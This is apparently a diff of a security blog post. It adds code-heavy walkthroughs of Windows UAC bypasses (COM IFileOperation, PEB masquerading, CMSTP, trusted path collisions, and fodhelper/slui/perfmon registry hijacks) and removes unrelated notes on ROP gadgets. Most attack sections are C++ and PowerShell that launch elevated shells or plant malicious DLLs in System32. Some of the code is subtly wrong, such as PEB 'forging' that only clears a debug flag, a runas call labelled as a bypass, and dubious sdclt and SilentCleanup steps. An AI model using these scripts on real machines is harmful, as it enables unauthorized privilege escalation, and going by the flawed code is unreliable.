+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;case DLL_THREAD_ATTACH:</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;case DLL_THREAD_DETACH:</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;case DLL_PROCESS_DETACH:</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return TRUE;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">This C++ code represents a simple DLL that, when loaded, displays a message box indicating the execution of malicious code.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Elevated COM Object UAC Bypass</strong></p>
+
+
+
+<p class="wp-block-paragraph">This technique involves creating an elevated COM object to perform operations without UAC prompts, as revealed in WikiLeaks&#8217; Vault 7 disclosures.</p>
+
+
+
+<p class="wp-block-paragraph">Windows 7 allows approved applications with admin privileges to perform system operations without UAC prompts.</p>
+
+
+
+<p class="wp-block-paragraph">A DLL loaded into explorer.exe can create an elevated IFileOperation object to manipulate privileged files.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Exploitation Example</strong></p>
+
+
+
+<p class="wp-block-paragraph">A malicious DLL can be injected into explorer.exe to use the IFileOperation COM Interface for privileged file operations.</p>
+
+
+
+<p class="wp-block-paragraph">C++ Code Example: Using IFileOperation for File Deletion</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;shobjidl.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">void ElevatedDelete() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;IFileOperation *pfo;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;CoInitialize(NULL);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_IFileOperation, (void**)&amp;pfo);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pfo-&gt;SetOperationFlags(FOF_NO_UI);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;IShellItem *psiFrom;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;SHCreateItemFromParsingName(L&#8221;C:\\Windows\\test.dll&#8221;, NULL, IID_PPV_ARGS(&amp;psiFrom));</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pfo-&gt;DeleteItem(psiFrom, NULL);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pfo-&gt;PerformOperations();</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;psiFrom-&gt;Release();</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pfo-&gt;Release();</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;CoUninitialize();</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">This code demonstrates how to use the IFileOperation interface to delete a file from a privileged directory.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>PowerShell Script: Triggering the Malicious DLL</strong></p>
+
+
+
+<p class="wp-block-paragraph"># Assuming the malicious DLL is named &#8216;malicious.dll&#8217; and placed appropriately</p>
+
+
+
+<p class="wp-block-paragraph">Start-Process -FilePath &#8220;C:\Windows\explorer.exe&#8221; -ArgumentList &#8220;path\to\malicious.dll&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">This PowerShell script is used to load the malicious DLL into explorer.exe.</p>
+
+
+
+<h1 class="wp-block-heading" id="h-bypass-uac-with-elevated-com-object-ifileoperation">Bypass UAC with Elevated COM Object(IFileOperation)</h1>
+
+
+
+<p class="wp-block-paragraph">User Account Control (UAC) is a security feature in Windows designed to prevent unauthorized changes to the operating system. However, certain techniques can bypass UAC, one of which involves exploiting the Elevated COM Object, specifically the IFileOperation interface. This article explores this method, providing a technical analysis and example codes in C++ and PowerShell.</p>
+
+
+
+<p class="wp-block-paragraph">Elevated COM Object (IFileOperation) Exploitation</p>
+
+
+
+<p class="wp-block-paragraph">The IFileOperation interface in Windows allows for file operations with elevated privileges. By manipulating this interface, it&#8217;s possible to perform privileged file operations without triggering UAC prompts.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Technical Overview</strong></p>
+
+
+
+<p class="wp-block-paragraph">The exploit involves forging the path in the Process Environment Block (PEB) to mimic explorer.exe.</p>
+
+
+
+<p class="wp-block-paragraph">The IFileOperation interface is then used to move or copy files to protected directories.</p>
+
+
+
+<p class="wp-block-paragraph">This technique was particularly effective in Windows 7 and 8.</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;shobjidl.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">// Function to forge PEB and use IFileOperation</p>
+
+
+
+<p class="wp-block-paragraph">void ForgePEBandUseIFileOperation() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Forging the PEB</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;__asm {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov eax, fs:[0x30] // For 32-bit, use fs:[0x30]. For 64-bit, use gs:[0x60]</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov byte ptr [eax+0x0C], 0 // Forging as explorer.exe</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Using IFileOperation</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;IFileOperation *pFileOp;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;CoInitialize(NULL);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_IFileOperation, (void**)&amp;pFileOp);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pFileOp-&gt;SetOperationFlags(FOF_NO_UI);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;IShellItem *pItemFrom, *pItemTo;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;SHCreateItemFromParsingName(L&#8221;C:\\Path\\To\\Malicious.dll&#8221;, NULL, IID_PPV_ARGS(&amp;pItemFrom));</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;SHCreateItemFromParsingName(L&#8221;C:\\Windows\\System32&#8243;, NULL, IID_PPV_ARGS(&amp;pItemTo));</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pFileOp-&gt;CopyItem(pItemFrom, pItemTo, NULL, NULL);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pFileOp-&gt;PerformOperations();</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pItemFrom-&gt;Release();</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pItemTo-&gt;Release();</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pFileOp-&gt;Release();</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;CoUninitialize();</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;ForgePEBandUseIFileOperation();</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">This C++ code demonstrates how to forge the PEB and use the IFileOperation interface to copy a malicious DLL into a protected system directory.</p>
+
+
+
+<h1 class="wp-block-heading" id="h-bypass-uac-with-cmstp">Bypass UAC with CMSTP</h1>
+
+
+
+<p class="wp-block-paragraph">The Connection Manager Profile Installer (cmstp.exe) in Windows has been a part of the operating system since Windows XP. It possesses an intriguing capability: executing command strings with elevated privileges. This article delves into how this feature can be exploited for arbitrary privilege elevation, based on research by Oddvar Moe and the masqueradePEB_CMSTP_UACBypass.cpp project.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>CMSTP Arbitrary Privilege Elevation Execution</strong></p>
+
+
+
+<p class="wp-block-paragraph">Technical Overview</p>
+
+
+
+<p class="wp-block-paragraph">cmstp.exe can execute a text command string during the installation of a connection profile.</p>
+
+
+
+<p class="wp-block-paragraph">It uses the COM interface to execute these commands, specifically the ShellExecute function within the ICMLuaUtil component.</p>
+
+
+
+<p class="wp-block-paragraph">By masquerading as a trusted system program (like explorer.exe), it&#8217;s possible to execute commands with elevated privileges.</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;iostream&gt;</p>
+
+
+
+<p class="wp-block-paragraph">// Function to masquerade process and execute command</p>
+
+
+
+<p class="wp-block-paragraph">void MasqueradePEBandExecuteCommand() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Masquerading as explorer.exe</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;__asm {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov eax, fs:[0x30] // Adjust for 64-bit if necessary</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov byte ptr [eax+0x0C], 0 // Masquerading</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Using CMSTP COM interface</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;ICMLuaUtil *pCMLuaUtil;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;CoInitialize(NULL);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;CoCreateInstance(CLSID_CMLuaUtil, NULL, CLSCTX_LOCAL_SERVER, IID_ICMLuaUtil, (void**)&amp;pCMLuaUtil);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Executing command</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pCMLuaUtil-&gt;ShellExec(L&#8221;cmd.exe&#8221;, L&#8221;/k \&#8221;echo exploit done. &gt; C:\\Windows\\System32\\misc &amp;&amp; type C:\\Windows\\System32\\misc\&#8221;&#8221;, NULL, SW_SHOW);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;pCMLuaUtil-&gt;Release();</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;CoUninitialize();</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;MasqueradePEBandExecuteCommand();</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">This C++ code demonstrates how to masquerade the process as explorer.exe and use the cmstp.exe COM interface to execute a command with elevated privileges.</p>
+
+
+
+<h1 class="wp-block-heading" id="h-bypass-uac-with-trusted-path-collisions">Bypass UAC with Trusted Path Collisions</h1>
+
+
+
+<p class="wp-block-paragraph">User Account Control (UAC) in Windows is a fundamental security feature designed to prevent unauthorized changes to the operating system. However, researchers like David Wells have discovered methods to bypass UAC by exploiting trusted path collisions. This article explores how attackers can achieve elevated privileges by manipulating the UAC authentication process, based on Wells&#8217; research and the technique presented at HITCON 2019.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1327" height="547" src="/wp-content/uploads/2023/11/image-11.png" alt="" class="wp-image-8096" srcset="/wp-content/uploads/2023/11/image-11.png 1327w, /wp-content/uploads/2023/11/image-11-300x124.png 300w, /wp-content/uploads/2023/11/image-11-1024x422.png 1024w, /wp-content/uploads/2023/11/image-11-768x317.png 768w" sizes="(max-width: 1327px) 100vw, 1327px" /></figure>
+
+
+
+<p class="wp-block-paragraph"><strong>Concept of Trusted Path Collisions</strong></p>
+
+
+
+<p class="wp-block-paragraph">Understanding UAC Authentication</p>
+
+
+
+<p class="wp-block-paragraph">For a program to automatically elevate privileges without triggering a UAC prompt, it must:</p>
+
+
+
+<p class="wp-block-paragraph">Be configured as Auto Elevation.</p>
+
+
+
+<p class="wp-block-paragraph">Have a valid digital signature.</p>
+
+
+
+<p class="wp-block-paragraph">Be executed from a trusted system directory (like System32 or SysWOW64).</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Exploiting Path Normalization</strong></p>
+
+
+
+<p class="wp-block-paragraph">Windows NT path normalization in the UAC service can be exploited to bypass these checks. The UAC service, when verifying a program&#8217;s path, does not account for certain manipulations in the path string, such as the inclusion of extra spaces or special characters.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Technical Exploitation</strong></p>
+
+
+
+<p class="wp-block-paragraph">Step 1: Creating a Malicious Program</p>
+
+
+
+<p class="wp-block-paragraph">First, create a program (e.g., BitLockerWizardElev.exe) with a manifest indicating requireAdministrator and autoElevate as true. This program should be designed to load a malicious DLL, which can be achieved through DLL side-loading.</p>
+
+
+
+<p class="wp-block-paragraph">Step 2: Bypassing Path Verification</p>
+
+
+
+<p class="wp-block-paragraph">Create a directory with a misleading name, such as C:\Windows \System32\ (note the space after Windows).</p>
+
+
+
+<p class="wp-block-paragraph">Place the malicious program and DLL in this directory.</p>
+
+
+
+<p class="wp-block-paragraph">Due to path normalization, Windows may treat this path as a trusted directory, bypassing the UAC check.</p>
+
+
+
+<p class="wp-block-paragraph">Step 3: Executing with Elevated Privileges</p>
+
+
+
+<p class="wp-block-paragraph">When the malicious program is executed from this directory, it can potentially run with elevated privileges without triggering a UAC prompt.</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Code to create a directory that exploits path normalization</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;mkdir \&#8221;C:\\Windows \\System32\&#8221;&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Code to copy the malicious program and DLL to the new directory</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;copy BitLockerWizardElev.exe \&#8221;C:\\Windows \\System32\&#8221;&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;copy Malicious.dll \&#8221;C:\\Windows \\System32\&#8221;&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Execute the malicious program</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;\&#8221;C:\\Windows \\System32\\BitLockerWizardElev.exe\&#8221;&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">Powershell Script Example</p>
+
+
+
+<p class="wp-block-paragraph"># Create the misleading directory</p>
+
+
+
+<p class="wp-block-paragraph">New-Item -Path &#8220;C:\Windows \System32&#8221; -ItemType Directory</p>
+
+
+
+<p class="wp-block-paragraph"># Copy the malicious files</p>
+
+
+
+<p class="wp-block-paragraph">Copy-Item &#8220;Path\To\BitLockerWizardElev.exe&#8221; -Destination &#8220;C:\Windows \System32&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">Copy-Item &#8220;Path\To\Malicious.dll&#8221; -Destination &#8220;C:\Windows \System32&#8221;</p>
+
+
+
+<p class="wp-block-paragraph"># Execute the malicious program</p>
+
+
+
+<p class="wp-block-paragraph">Start-Process &#8220;C:\Windows \System32\BitLockerWizardElev.exe&#8221;</p>
+
+
+
+<h1 class="wp-block-heading" id="h-bypass-uac-with-lolbins">Bypass UAC with LOLBins</h1>
+
+
+
+<p class="wp-block-paragraph"><strong>1. UAC Bypass Using runas</strong></p>
+
+
+
+<p class="wp-block-paragraph">This method involves invoking a high-privilege process using the runas command.</p>
+
+
+
+<p class="wp-block-paragraph">C++ Code Example</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;iostream&gt;</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;WinExec(&#8220;runas /user:administrator \&#8221;cmd.exe /c start cmd.exe\&#8221;&#8221;, SW_HIDE);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">PowerShell Script Example</p>
+
+
+
+<p class="wp-block-paragraph">Start-Process &#8220;cmd.exe&#8221; -ArgumentList &#8220;/c start cmd.exe&#8221; -Verb runAs</p>
+
+
+
+<p class="wp-block-paragraph"><strong>2. UAC Bypass Using fodhelper.exe</strong></p>
+
+
+
+<p class="wp-block-paragraph">fodhelper.exe is a trusted binary that can be exploited to bypass UAC.</p>
+
+
+
+<p class="wp-block-paragraph">C++ Code Example</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d \&#8221;cmd.exe\&#8221;&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;start fodhelper.exe&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">PowerShell Script Example</p>
+
+
+
+<p class="wp-block-paragraph">New-Item -Path &#8220;HKCU:\Software\Classes\ms-settings\shell\open\command&#8221; -Force</p>
+
+
+
+<p class="wp-block-paragraph">Set-ItemProperty -Path &#8220;HKCU:\Software\Classes\ms-settings\shell\open\command&#8221; -Name &#8220;(Default)&#8221; -Value &#8220;cmd.exe&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">Start-Process &#8220;fodhelper.exe&#8221;</p>
+
+
+
+<p class="wp-block-paragraph"><strong>3. UAC Bypass Using slui.exe</strong></p>
+
+
+
+<p class="wp-block-paragraph">slui.exe is another trusted binary that can be exploited.</p>
+
+
+
+<p class="wp-block-paragraph">C++ Code Example</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;reg add HKCU\\Software\\Classes\\exefile\\shell\\open\\command /f /ve /t REG_SZ /d \&#8221;cmd.exe\&#8221;&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;reg add HKCU\\Software\\Classes\\exefile\\shell\\open\\command /v DelegateExecute /f&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;start slui.exe&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">PowerShell Script Example</p>
+
+
+
+<p class="wp-block-paragraph">New-Item -Path &#8220;HKCU:\Software\Classes\exefile\shell\open\command&#8221; -Force</p>
+
+
+
+<p class="wp-block-paragraph">Set-ItemProperty -Path &#8220;HKCU:\Software\Classes\exefile\shell\open\command&#8221; -Name &#8220;(Default)&#8221; -Value &#8220;cmd.exe&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">Start-Process &#8220;slui.exe&#8221;</p>
+
+
+
+<p class="wp-block-paragraph"><strong>4. UAC Bypass Using SilentCleanup Scheduled Task</strong></p>
+
+
+
+<p class="wp-block-paragraph">This method exploits the SilentCleanup task which runs with elevated privileges.</p>
+
+
+
+<p class="wp-block-paragraph">PowerShell Script Example</p>
+
+
+
+<p class="wp-block-paragraph">$trigger = New-ScheduledTaskTrigger -AtLogon</p>
+
+
+
+<p class="wp-block-paragraph">$action = New-ScheduledTaskAction -Execute &#8220;cmd.exe&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">Register-ScheduledTask -TaskName &#8220;SilentCleanup&#8221; -Trigger $trigger -Action $action -RunLevel Highest</p>
+
+
+
+<p class="wp-block-paragraph">Start-ScheduledTask -TaskName &#8220;SilentCleanup&#8221;</p>
+
+
+
+<p class="wp-block-paragraph"><strong>5. UAC Bypass Using sdclt.exe (IsolatedCommand)</strong></p>
+
+
+
+<p class="wp-block-paragraph">This method involves manipulating the IsolatedCommand registry key.</p>
+
+
+
+<p class="wp-block-paragraph">PowerShell Script Example</p>
+
+
+
+<p class="wp-block-paragraph">Set-ItemProperty -Path &#8220;HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&#8221; -Name &#8220;IsolatedCommand&#8221; -Value &#8220;cmd.exe&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">Start-Process &#8220;sdclt.exe&#8221;</p>
+
+
+
+<p class="wp-block-paragraph"><strong>6. UAC Bypass Using sdclt.exe (App Paths)</strong></p>
+
+
+
+<p class="wp-block-paragraph">This method is similar to the previous one but uses the App Paths registry key.</p>
+
+
+
+<p class="wp-block-paragraph">PowerShell Script Example</p>
+
+
+
+<p class="wp-block-paragraph">Set-ItemProperty -Path &#8220;HKCU:\Software\Classes\exefile\shell\open\command&#8221; -Name &#8220;(Default)&#8221; -Value &#8220;cmd.exe&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">Start-Process &#8220;sdclt.exe&#8221;</p>
+
+
+
+<p class="wp-block-paragraph"><strong>7. UAC Bypass Using perfmon.exe</strong></p>
+
+
+
+<p class="wp-block-paragraph">perfmon.exe can also be used for UAC bypass.</p>
+
+
+
+<p class="wp-block-paragraph">C++ Code Example</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;reg add HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\perfmon.exe /v Debugger /t REG_SZ /d \&#8221;cmd.exe\&#8221;&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;system(&#8220;start perfmon.exe&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">PowerShell Script Example</p>
+
+
+
+<p class="wp-block-paragraph">Set-ItemProperty -Path &#8220;HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\perfmon.exe&#8221; -Name &#8220;Debugger&#8221; -Value &#8220;cmd.exe&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">Start-Process &#8220;perfmon.exe&#8221;</p>
+
+
+
+<h1 class="wp-block-heading" id="h-references">References</h1>
+
+
+
 <ul class="wp-block-list">
-<li>Memory leaks can reveal address locations.</li>
-
-
-
-<li>If certain libraries or sections are not fully randomized, ROP gadgets can still be located.</li>
+<li>Windows APT Warfare by SHENG-HAO</li>
 </ul>
-</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">2. <strong>Data Execution Prevention (DEP)</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Marks memory regions (e.g., stack, heap) as non-executable.</li>
-
-
-
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>ROP reuses existing executable code, bypassing the need to inject new code.</li>
-</ul>
-</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">3. <strong>Stack Canaries</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Detects buffer overflows by placing a random value before the return address.</li>
-
-
-
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>If the canary is leaked, the attacker can overwrite the return address without detection.</li>
-</ul>
-</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">4. <strong>Control Flow Integrity (CFI)</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Ensures the control flow follows valid paths in the program.</li>
-
-
-
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>ROP gadgets can mimic valid control flows, making it difficult for CFI to detect.</li>
-</ul>
-</li>
-</ul>
-
-
-
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://github.com/xct/ropstar
-</div></figure>
-
-
-
-<h4 class="wp-block-heading">Types of ROP Gadgets</h4>
-
-
-
-<p class="wp-block-paragraph">ROP gadgets can be classified into several types, each serving distinct purposes in an exploit.</p>
-
-
-
-<p class="wp-block-paragraph">POP Gadgets are fundamental for manipulating the stack and registers, as they typically contain one or more POP instructions that load values from the stack into registers. This is essential for setting up the right context for later operations.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Load values from the stack into registers.</li>
-
-
-
-<li><strong>Example</strong>: <code>pop rdi; ret</code></li>
-
-
-
-<li><strong>Usage</strong>: Essential for setting up parameters before function calls.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">RET Gadgets are the simplest form of gadgets, consisting of just a RET instruction. They serve to redirect control flow, allowing the execution to jump to the next gadget in a chain, thereby maintaining the sequence of operations.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Control flow redirection using <code>ret</code> instructions.</li>
-
-
-
-<li><strong>Usage</strong>: Used to jump to the next gadget in a chain, ensuring the sequence of operations.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">MOV Gadgets facilitate data transfer between registers or between registers and memory. By utilizing these gadgets, attackers can efficiently move values needed for calculations or function parameters, crucial for shaping the exploit&#8217;s behavior.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Move data between registers or memory.</li>
-
-
-
-<li><strong>Usage</strong>: Useful for setting up function arguments or controlling data flow during the exploit.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">Arithmetic Gadgets perform various mathematical operations, including addition, subtraction, multiplication, and division. These gadgets enable dynamic computation of values during the exploit, allowing for more complex manipulations.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Perform arithmetic operations like addition, subtraction, or XOR.</li>
-
-
-
-<li><strong>Usage</strong>: Can dynamically compute values during exploitation.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">Lastly, System Call Gadgets are designed to invoke system calls, enabling the exploit to interact directly with the operating system. This is vital for performing actions like spawning shells or manipulating files, ultimately achieving the attacker’s goals. Together, these gadget types create a versatile toolkit for sophisticated ROP attacks.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Trigger system calls to interact with the operating system (e.g., spawn a shell).</li>
-
-
-
-<li><strong>Usage</strong>: These gadgets are vital for achieving the final goals of an exploit.</li>
-</ul>
-
-
-
-<h3 class="wp-block-heading">Finding ROP Gadgets</h3>
-
-
-
